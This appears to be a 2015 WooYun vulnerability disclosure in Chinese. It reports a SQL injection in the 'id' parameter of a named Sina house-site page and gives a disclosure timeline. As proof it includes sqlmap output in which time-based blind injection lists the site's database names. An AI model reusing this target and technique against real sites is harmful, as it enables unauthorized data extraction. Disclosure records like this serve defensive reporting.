wybug_detail: 漏洞详情 披露状态：   									2015-07-29：	细节已通知厂商并且等待厂商处理中									2015-07-29：	厂商已经确认，细节仅向厂商公开									2015-08-08：	细节向核心白帽子及相关领域专家公开									2015-08-18：	细节向普通白帽子公开									2015-08-28：	细节向实习白帽子公开									2015-09-12：	细节向公众公开  简要描述： 净化全网sql注入，人人有责 详细说明：  http://supports.house.sina.com.cn/decor/photolib/getonephoto_200808.php?id=6740&type=room参数 id   漏洞证明：  ---[15:37:44] [INFO] the back-end DBMS is MySQLweb application technology: Apacheback-end DBMS: MySQL 5[15:37:44] [INFO] fetching database names[15:37:44] [INFO] fetching number of databases[15:37:44] [WARNING] time-based comparison requires larger statistical model, please wait..............................    [15:37:47] [WARNING] it is very important not to stress the network adapter during usage of time-based payloads to prevent potential errors do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y[15:38:04] [INFO] adjusting time delay to 2 seconds due to good response times3[15:38:05] [INFO] retrieved: information_schema[15:40:47] [ERROR] invalid character detected. retrying..[15:40:47] [WARNING] increasing time delay to 3 seconds [15:40:49] [INFO] retrieved: supports_house_sina_com_cn[15:46:51] [INFO] retrieved: testavailable databases [3]:[*] information_schema[*] supports_house_sina_com_cn[*] test   修复方案：     版权声明：转载请注明来源 路人甲@乌云
